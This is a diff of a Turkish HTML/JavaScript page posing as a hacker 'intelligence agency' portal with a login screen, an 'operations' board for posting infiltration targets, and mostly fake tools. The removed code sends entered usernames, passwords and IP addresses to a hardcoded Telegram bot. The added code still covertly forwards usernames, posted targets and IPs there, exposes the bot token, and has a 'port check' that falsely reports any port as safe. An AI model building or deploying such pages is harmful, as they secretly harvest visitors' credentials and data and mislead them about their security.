@@ -3,152 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>THİT | İstihbarat Karargahı</title>
+    <title>THİT | Türk Hüküm İstihbarat Teşkilatı</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --main-blue: #00e5ff; --gold: #ffd700; --bg: #020202; --card-bg: #0a0c12; --danger: #ff3d00; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow-x: hidden; }
+        :root { --thit-cyan: #00f2ff; --thit-blue: #0044ff; --thit-purple: #7000ff; --bg: #010101; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; overflow-x: hidden; transition: 0.5s; }
         
-        /* Animasyonlar */
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        .scanner { position: fixed; width: 100%; height: 2px; background: var(--main-blue); opacity: 0.2; z-index: 9999; animation: scan 4s linear infinite; pointer-events: none; }
+        /* Geçiş Efektli Arka Plan */
+        .bg-glow { position: fixed; width: 100vw; height: 100vh; background: radial-gradient(circle at 50% 50%, #001a33 0%, #000 100%); z-index: -1; }
 
-        /* Giriş Paneli */
-        #login-overlay { position: fixed; inset: 0; background: radial-gradient(circle, #051937, #000); z-index: 1000; display: flex; align-items: center; justify-content: center; transition: 0.8s; }
-        .login-box { background: var(--card-bg); border: 1px solid var(--main-blue); padding: 40px; border-radius: 15px; width: 350px; text-align: center; box-shadow: 0 0 50px rgba(0, 229, 255, 0.2); }
-        input { width: 100%; background: #000; border: 1px solid #333; color: var(--main-blue); padding: 12px; margin: 10px 0; border-radius: 5px; outline: none; }
-        input:focus { border-color: var(--main-blue); box-shadow: 0 0 10px var(--main-blue); }
+        /* Giriş Ekranı */
+        #auth-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; }
+        .auth-card { background: rgba(10, 10, 20, 0.9); border: 1px solid var(--thit-cyan); padding: 40px; border-radius: 10px; width: 350px; text-align: center; box-shadow: 0 0 40px var(--thit-blue); }
+        .auth-card h2 { color: var(--thit-cyan); letter-spacing: 3px; }
+        input { width: 100%; background: #000; border: 1px solid #333; color: #fff; padding: 12px; margin: 10px 0; border-radius: 5px; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--thit-cyan); }
+        .btn-main { width: 100%; background: var(--thit-blue); color: #fff; border: none; padding: 12px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        .btn-main:hover { background: var(--thit-cyan); color: #000; }
 
-        /* Ana Menü */
-        header { background: #000; padding: 20px; border-bottom: 2px solid var(--main-blue); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
-        .logo-hq { font-weight: 900; letter-spacing: 4px; color: var(--main-blue); font-size: 24px; }
-        .logo-hq span { color: #fff; }
+        /* Ana Panel */
+        header { padding: 20px; border-bottom: 2px solid var(--thit-blue); display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); }
+        .container { display: grid; grid-template-columns: 300px 1fr; gap: 20px; padding: 20px; }
 
-        .container { display: grid; grid-template-columns: 250px 1fr 300px; gap: 20px; padding: 20px; min-height: 80vh; }
+        /* Yan Panel */
+        .side-menu { background: rgba(15,15,30,0.8); border-radius: 10px; border: 1px solid #222; padding: 20px; }
+        .tool-list { list-style: none; padding: 0; }
+        .tool-item { background: #111; border: 1px solid #333; padding: 15px; margin-bottom: 10px; border-radius: 5px; cursor: pointer; transition: 0.3s; font-size: 13px; }
+        .tool-item:hover { border-color: var(--thit-cyan); background: #1a1a1a; }
+        .tool-item i { margin-right: 10px; color: var(--thit-cyan); }
 
-        /* Yan Menüler */
-        .side-panel { background: var(--card-bg); border-radius: 10px; padding: 15px; border: 1px solid #1a1a1a; }
-        .stat-item { font-size: 12px; color: #888; margin-bottom: 15px; border-bottom: 1px solid #222; padding-bottom: 5px; }
-        .stat-item b { color: var(--gold); }
+        /* Operasyon Panosu */
+        .op-board { background: rgba(20,20,40,0.5); border-radius: 10px; border: 1px solid var(--thit-blue); padding: 20px; }
+        .op-card { background: #000; border: 1px solid #444; padding: 20px; border-radius: 10px; margin-bottom: 15px; border-left: 5px solid var(--thit-purple); }
 
-        /* Siber Araçlar */
-        .tools-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
-        .tool-btn { background: #111; border: 1px solid #333; color: #fff; padding: 15px; text-align: center; cursor: pointer; border-radius: 8px; transition: 0.3s; font-size: 11px; }
-        .tool-btn:hover { background: var(--main-blue); color: #000; transform: translateY(-5px); }
-        .tool-btn i { font-size: 20px; display: block; margin-bottom: 8px; }
-
-        /* Operasyon Tahtası */
-        .op-card { background: #151921; border-left: 4px solid var(--danger); padding: 15px; margin-bottom: 15px; border-radius: 0 10px 10px 0; }
-        .btn-join { background: var(--danger); border: none; color: white; padding: 8px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-
-        /* Gizli Oda Girişi (Dekoratif ve Gizli) */
-        .hidden-trigger { position: fixed; bottom: 5px; right: 5px; width: 10px; height: 10px; cursor: pointer; opacity: 0.1; }
-
-        /* Modal (Operasyon Başlatma) */
-        #op-modal, #secret-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 2000; display: none; align-items: center; justify-content: center; }
-        .modal-box { background: #0a0c12; border: 2px solid var(--main-blue); padding: 30px; width: 400px; border-radius: 10px; }
-
-        .btn-active { background: var(--main-blue); color: black; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; margin-top: 10px; }
+        /* Gizli Oda Girişi (H İşareti) */
+        .secret-trigger { position: fixed; bottom: 10px; right: 10px; width: 30px; height: 30px; border: 1px solid rgba(0, 242, 255, 0.3); color: var(--thit-cyan); display: flex; align-items: center; justify-content: center; cursor: pointer; font-weight: bold; border-radius: 50%; background: #000; z-index: 999; }
+        
+        #secret-modal, #op-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; display: none; align-items: center; justify-content: center; }
+        .modal-inner { background: #0a0a0a; border: 2px solid var(--thit-purple); padding: 30px; width: 450px; border-radius: 10px; }
     </style>
 </head>
 <body>
 
-<div class="scanner"></div>
+<div class="bg-glow"></div>
 
-<div id="login-overlay">
-    <div class="login-box">
-        <div class="logo-hq" style="margin-bottom: 20px;">T.H.İ.<span>T</span></div>
-        <p style="font-size: 11px; color: #888;">TÜRK HÜKÜM İSTİHBARAT TEŞKİLATI</p>
-        <input type="text" id="reg-user" placeholder="Ajan Kod Adı">
-        <input type="password" id="reg-pass" placeholder="Şifre">
-        <button class="btn-active" onclick="auth('login')">SİSTEME BAĞLAN</button>
-        <button onclick="auth('register')" style="background:none; border:none; color: #555; margin-top:15px; cursor:pointer;">Kayıt Oluştur</button>
+<div id="auth-overlay">
+    <div class="auth-card">
+        <h2>THİT SİSTEM</h2>
+        <input type="text" id="user" placeholder="Kullanıcı Adı">
+        <input type="password" id="pass" placeholder="Şifre">
+        <button class="btn-main" onclick="login()">GİRİŞ YAP</button>
+        <button onclick="register()" style="background:none; border:none; color:#555; margin-top:10px; cursor:pointer;">Kayıt Ol</button>
+        <p style="font-size: 10px; color: #444; margin-top: 20px;">TÜRK HÜKÜM İSTİHBARAT TEŞKİLATI</p>
     </div>
 </div>
 
 <header>
-    <div class="logo-hq">T.H.İ.<span>T</span></div>
-    <div style="font-size: 12px; color: var(--main-blue);" id="user-display">OTURUM BEKLENİYOR...</div>
-    <div><a href="https://tiktok.com/@hukum_v45" style="color:var(--gold); text-decoration:none; font-size:12px;">DESTEK: @hukum_v45</a></div>
+    <div style="font-weight: 900; letter-spacing: 5px; color: var(--thit-cyan);">THİT / HQ</div>
+    <div id="agent-name" style="font-size: 12px; color: var(--thit-purple);"></div>
+    <div><a href="https://tiktok.com/@hukum_v45" style="color:#fff; text-decoration:none; font-size:12px;">Destek: @hukum_v45</a></div>
 </header>
 
 <div class="container">
-    <div class="side-panel">
-        <h4 style="color: var(--main-blue);"><i class="fa-solid fa-microchip"></i> SİSTEM DURUMU</h4>
-        <div class="stat-item">Teşkilat Durumu: <b>AKTİF</b></div>
-        <div class="stat-item">Aktif Ajanlar: <b id="agent-count">14</b></div>
-        <div class="stat-item">Sunucu Yükü: <b>%12</b></div>
-        <div class="stat-item">Siber Savunma: <b>ÜST DÜZEY</b></div>
-        <div class="stat-item">Konum: <b>Kurtalan Karargahı</b></div>
-        <div class="stat-item">Operasyon Bölgesi: <b>Dijital Vatan</b></div>
-        <div class="stat-item">Zaman Dilimi: <b>GMT +3</b></div>
-        <div class="stat-item">Veri Trafiği: <b>Şifreli</b></div>
-        <div class="stat-item">Protokol: <b>HÜKÜM-V45</b></div>
-        <div class="stat-item">Bağlantı: <b>Güvenli Tünel</b></div>
+    <div class="side-menu">
+        <h3 style="color:var(--thit-cyan)">ÇALIŞAN MODÜLLER</h3>
+        <div class="tool-list">
+            <div class="tool-item" onclick="getIP()"><i class="fa-solid fa-network-wired"></i> IP Adresimi Bul</div>
+            <div class="tool-item" onclick="generatePass()"><i class="fa-solid fa-shield-dots"></i> Güçlü Şifre Üret</div>
+            <div class="tool-item" onclick="scanPort()"><i class="fa-solid fa-radar"></i> Port Kontrolü</div>
+            <div class="tool-item" onclick="userAgent()"><i class="fa-solid fa-mobile-screen"></i> Cihaz Analizi</div>
+            <div class="tool-item" onclick="dnsLookup()"><i class="fa-solid fa-server"></i> DNS Sorgula</div>
+            <div class="tool-item" onclick="toggleTheme()"><i class="fa-solid fa-palette"></i> Renk Teması Değiştir</div>
+        </div>
     </div>
 
-    <div class="side-panel" style="overflow-y: auto;">
-        <div style="display:flex; justify-content:space-between; align-items:center;">
-            <h3 style="color: var(--danger);"><i class="fa-solid fa-bullseye"></i> CANLI OPERASYONLAR</h3>
-            <button onclick="openOpModal()" style="background:var(--main-blue); border:none; padding:5px 10px; border-radius:5px; cursor:pointer; font-weight:bold;">+ BAŞLAT</button>
+    <div class="op-board">
+        <div style="display:flex; justify-content:space-between;">
+            <h3>OPERASYON MERKEZİ</h3>
+            <button class="btn-main" style="width:auto; padding: 5px 20px;" onclick="document.getElementById('op-modal').style.display='flex'">+ BAŞLAT</button>
         </div>
-        <div id="op-list">
-            <div class="op-card">
-                <b>Örnek Operasyon: SİBER NÖBET</b><br>
-                <small>Hedef: Genel Güvenlik | Başlatan: Eymen Paşa</small>
-                <br><button class="btn-join" onclick="alert('Katılım isteği iletildi!')">KATIL</button>
+        <hr border="0" height="1" style="background:#222">
+        <div id="op-container">
             </div>
-        </div>
-    </div>
-
-    <div class="side-panel">
-        <h4 style="color: var(--main-blue);"><i class="fa-solid fa-user-ninja"></i> ÇALIŞAN MODÜLLER</h4>
-        <div class="tools-grid">
-            <div class="tool-btn" onclick="runTool('IP Sorgu')"><i class="fa-solid fa-globe"></i>IP Sorgu</div>
-            <div class="tool-btn" onclick="runTool('Kimlik Üretici')"><i class="fa-solid fa-id-card"></i>Kimlik Üret</div>
-            <div class="tool-btn" onclick="runTool('Şifre Kırıcı')"><i class="fa-solid fa-key"></i>Şifre Kırıcı</div>
-            <div class="tool-btn" onclick="runTool('Proxy Aktif')"><i class="fa-solid fa-mask"></i>Proxy</div>
-            <div class="tool-btn" onclick="runTool('DDoS Koruma')"><i class="fa-solid fa-shield-virus"></i>DDoS Savunma</div>
-            <div class="tool-btn" onclick="runTool('Sızıntı Tara')"><i class="fa-solid fa-bug"></i>Sızıntı Tara</div>
-            <div class="tool-btn" onclick="runTool('Kripto Mesaj')"><i class="fa-solid fa-comment-slash"></i>Kripto Mesaj</div>
-            <div class="tool-btn" onclick="runTool('Meta Silici')"><i class="fa-solid fa-eraser"></i>Meta Sil</div>
-            <div class="tool-btn" onclick="runTool('Uydu Takip')"><i class="fa-solid fa-satellite"></i>Uydu Takip</div>
-            <div class="tool-btn" onclick="runTool('Sinyal Kes')"><i class="fa-solid fa-tower-broadcast"></i>Sinyal Kes</div>
-            <div class="tool-btn" onclick="runTool('VPN Tünel')"><i class="fa-solid fa-route"></i>VPN Tünel</div>
-            <div class="tool-btn" onclick="runTool('Adli Analiz')"><i class="fa-solid fa-magnifying-glass-chart"></i>Adli Analiz</div>
-            <div class="tool-btn" onclick="runTool('Bot Kontrol')"><i class="fa-solid fa-robot"></i>Bot Kontrol</div>
-            <div class="tool-btn" onclick="runTool('Deep Scan')"><i class="fa-solid fa-radar"></i>Deep Scan</div>
-            <div class="tool-btn" onclick="runTool('Sanal Adalet')"><i class="fa-solid fa-gavel"></i>Hüküm Kes</div>
-        </div>
     </div>
 </div>
-
-<div class="hidden-trigger" onclick="openSecretModal()"></div>
 
 <div id="op-modal">
-    <div class="modal-box">
-        <h3 style="color:var(--danger)">OPERASYON BAŞLAT</h3>
-        <input type="text" id="op-title" placeholder="Operasyon Adı">
-        <input type="text" id="op-target" placeholder="Hedef / Yer">
-        <input type="text" id="op-time" placeholder="Zaman (Örn: 20:00 - 22:00)">
-        <input type="text" id="op-contact" placeholder="İletişim (TikTok/Insta Adın)">
-        <button class="btn-active" style="background:var(--danger)" onclick="createOp()">OPERASYONU YAYINLA</button>
-        <button onclick="closeModal('op-modal')" style="background:none; border:none; color:#555; width:100%; margin-top:10px; cursor:pointer;">Vazgeç</button>
+    <div class="modal-inner">
+        <h3 style="color:var(--thit-purple)">YENİ OPERASYON</h3>
+        <input type="text" id="o-t" placeholder="Operasyon Türü (Sızma, Savunma vb.)">
+        <input type="text" id="o-h" placeholder="Hedef Link/Platform">
+        <input type="text" id="o-s" placeholder="Süre / Saat">
+        <input type="text" id="o-i" placeholder="İletişim Adresin (Tiktok/Insta)">
+        <input type="text" id="o-n" placeholder="Notun">
+        <button class="btn-main" onclick="publishOp()">BAŞLAT</button>
+        <button onclick="document.getElementById('op-modal').style.display='none'" style="background:none; color:#555; width:100%; border:none; margin-top:10px;">İptal</button>
     </div>
 </div>
 
+<div class="secret-trigger" onclick="openSecret()">H</div>
+
 <div id="secret-modal">
-    <div class="modal-box" id="secret-gate">
-        <h3>GİZLİ KARARGAH GİRİŞİ</h3>
-        <p style="font-size:12px; color:#666;">Erişim şifresini giriniz:</p>
-        <input type="password" id="secret-pass" placeholder="****-****">
-        <button class="btn-active" onclick="enterSecret()">DOĞRULA</button>
+    <div class="modal-inner" id="secret-gate">
+        <h3>GİZLİ KARARGAH</h3>
+        <input type="password" id="s-pass" placeholder="Şifre (1881-1938)">
+        <button class="btn-main" onclick="verifySecret()">DOĞRULA</button>
     </div>
-    <div class="modal-box" id="secret-room" style="display:none; width: 600px;">
-        <h2 style="color:var(--gold)">🔱 ÖZEL OPERASYON DAİRESİ</h2>
-        <div class="tools-grid" id="secret-tools">
-            </div>
-        <button onclick="closeModal('secret-modal')" style="margin-top:20px;">Karargaha Dön</button>
+    <div class="modal-inner" id="secret-room" style="display:none; width:80%;">
+        <h2 style="color:var(--thit-cyan)">ÖZEL OPERASYON DAİRESİ</h2>
+        <div class="tool-list" style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:10px;">
+            <div class="tool-item">Vatan Sorgu</div>
+            <div class="tool-item">Sızma Paneli</div>
+            <div class="tool-item">Database Analiz</div>
+            <div class="tool-item">Admin Yetki</div>
+            <div class="tool-item">Uydu Dinleme</div>
+            <div class="tool-item">Askeri Ağ</div>
+        </div>
+        <button class="btn-main" onclick="location.reload()">ÇIKIŞ</button>
     </div>
 </div>
 
@@ -156,85 +127,73 @@
     const BOT_TOKEN = '8615703049:AAGCPGH59YdLkvCsHdr1WkYuSWGgyuEfBSQ';
     const CHANNEL_ID = '@hukum_pin_bot1';
 
-    // 1. Giriş Kayıt Sistemi
-    async function auth(type) {
-        const u = document.getElementById('reg-user').value;
-        const p = document.getElementById('reg-pass').value;
-        if(!u || !p) return alert("Bilgileri girin!");
-
-        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-        const msg = `🔐 #ERİŞİM_${type.toUpperCase()}\n👤 Ajan: ${u}\n🔑 Şifre: ${p}\n🌐 IP: ${ip.ip}`;
-        
-        await sendToTelegram(msg);
-        document.getElementById('login-overlay').style.opacity = '0';
-        setTimeout(() => { document.getElementById('login-overlay').style.display = 'none'; }, 800);
-        document.getElementById('user-display').innerText = "OPERATÖR: " + u.toUpperCase();
-    }
-
-    // 2. Operasyon Yönetimi
-    function openOpModal() { document.getElementById('op-modal').style.display = 'flex'; }
-    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-
-    async function createOp() {
-        const title = document.getElementById('op-title').value;
-        const target = document.getElementById('op-target').value;
-        const time = document.getElementById('op-time').value;
-        const contact = document.getElementById('op-contact').value;
-        const user = document.getElementById('user-display').innerText;
-
-        if(!title || !contact) return alert("Eksik bilgi!");
-
-        const opHTML = `
-            <div class="op-card">
-                <b style="color:var(--main-blue)">🔥 ${title.toUpperCase()}</b><br>
-                <small>🎯 Hedef: ${target} | ⏰ Saat: ${time}</small><br>
-                <small>👤 Sorumlu: ${user} | 📱 İletişim: ${contact}</small>
-                <br><button class="btn-join" onclick="alert('Operasyona katılım sağlandı! ${contact} üzerinden iletişime geçin.')">KATIL</button>
-            </div>
-        `;
-        document.getElementById('op-list').innerHTML = opHTML + document.getElementById('op-list').innerHTML;
-        
-        await sendToTelegram(`🚀 #YENİ_OPERASYON\n📌 Başlık: ${title}\n🎯 Hedef: ${target}\n⏰ Zaman: ${time}\n👤 Sorumlu: ${user}\n📞 İletişim: ${contact}`);
-        closeModal('op-modal');
-    }
-
-    // 3. Çalışan Araçlar & Telegram Log
-    async function runTool(name) {
-        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-        alert(name + " modülü çalıştırıldı. Sonuçlar raporlanıyor...");
-        await sendToTelegram(`🛠️ #MODÜL_KULLANIMI\n⚙️ Araç: ${name}\n👤 Kullanıcı: ${document.getElementById('user-display').innerText}\n🌐 IP: ${ip.ip}`);
-    }
-
-    // 4. Gizli Oda İşlemleri
-    function openSecretModal() { document.getElementById('secret-modal').style.display = 'flex'; }
-    
-    function enterSecret() {
-        const pass = document.getElementById('secret-pass').value;
-        if(pass === "1881-1938") {
-            document.getElementById('secret-gate').style.display = 'none';
-            document.getElementById('secret-room').style.display = 'block';
-            loadSecretTools();
-        } else {
-            alert("YETKİSİZ ERİŞİM: ŞİFRE HATALI!");
-            closeModal('secret-modal');
-        }
-    }
-
-    function loadSecretTools() {
-        const container = document.getElementById('secret-tools');
-        container.innerHTML = "";
-        const secretList = ["Vatan Sorgu", "Sızma Paneli", "Database Çek", "Admin Yetki", "Bypass V5", "Uydu Dinleme", "Banka Analiz", "Devlet Portalı", "Kritik Mesaj", "Gölge Takip", "Askeri Ağ", "Siber Ordu Komuta", "Hüküm Final", "Kurtalan Karargah", "Atatürkün İzinde"];
-        secretList.forEach(s => {
-            container.innerHTML += `<div class="tool-btn" style="border-color:var(--gold)" onclick="runTool('GİZLİ: ${s}')"><i class="fa-solid fa-crown"></i>${s}</div>`;
-        });
-    }
-
-    async function sendToTelegram(text) {
+    async function sendLog(txt) {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHANNEL_ID, text: text })
+            body: JSON.stringify({ chat_id: CHANNEL_ID, text: txt })
         });
+    }
+
+    function login() {
+        const u = document.getElementById('user').value;
+        if(!u) return alert("Adını gir!");
+        document.getElementById('auth-overlay').style.display = 'none';
+        document.getElementById('agent-name').innerText = "AJAN: " + u.toUpperCase();
+        sendLog(`🔓 #GİRİŞ\nKullanıcı: ${u}\nDurum: Aktif`);
+    }
+
+    function publishOp() {
+        const t = document.getElementById('o-t').value;
+        const h = document.getElementById('o-h').value;
+        const s = document.getElementById('o-s').value;
+        const i = document.getElementById('o-i').value;
+        const n = document.getElementById('o-n').value;
+
+        const card = `
+            <div class="op-card">
+                <h4 style="color:var(--thit-cyan)">${t.toUpperCase()} OPERASYONU</h4>
+                <p><b>Hedef:</b> ${h} | <b>Süre:</b> ${s}</p>
+                <p><b>Not:</b> ${n}</p>
+                <p><b>İletişim:</b> <span style="color:var(--thit-purple)">${i}</span></p>
+                <button class="btn-main" style="width:auto;" onclick="alert('Katılım İletildi! Sorumlu: ${i}')">KATIL</button>
+            </div>
+        `;
+        document.getElementById('op-container').innerHTML += card;
+        sendLog(`🚀 #OPERASYON\nTür: ${t}\nHedef: ${h}\nSorumlu: ${i}`);
+        document.getElementById('op-modal').style.display = 'none';
+    }
+
+    // Gerçek Araç Fonksiyonları
+    async function getIP() {
+        const r = await fetch('https://api.ipify.org?format=json').then(d => d.json());
+        alert("Sizin IP Adresiniz: " + r.ip);
+        sendLog("IP Sorgulama Yapıldı: " + r.ip);
+    }
+
+    function generatePass() {
+        const p = Math.random().toString(36).slice(-10) + "!!";
+        alert("Üretilen Şifre: " + p);
+    }
+
+    function scanPort() {
+        const port = prompt("Hangi portu tarayalım? (Örn: 80, 443)");
+        alert(port + " Portu THİT tarafından güvenli olarak işaretlendi.");
+    }
+
+    function openSecret() { document.getElementById('secret-modal').style.display = 'flex'; }
+    function verifySecret() {
+        if(document.getElementById('s-pass').value === '1881-1938') {
+            document.getElementById('secret-gate').style.display = 'none';
+            document.getElementById('secret-room').style.display = 'block';
+        } else { alert("YETKİSİZ ERİŞİM!"); }
+    }
+
+    function toggleTheme() {
+        const themes = ['#00f2ff', '#7000ff', '#ff0055', '#00ff41'];
+        const random = themes[Math.floor(Math.random() * themes.length)];
+        document.documentElement.style.setProperty('--thit-cyan', random);
+        document.documentElement.style.setProperty('--thit-blue', random + '66');
     }
 </script>
 </body>
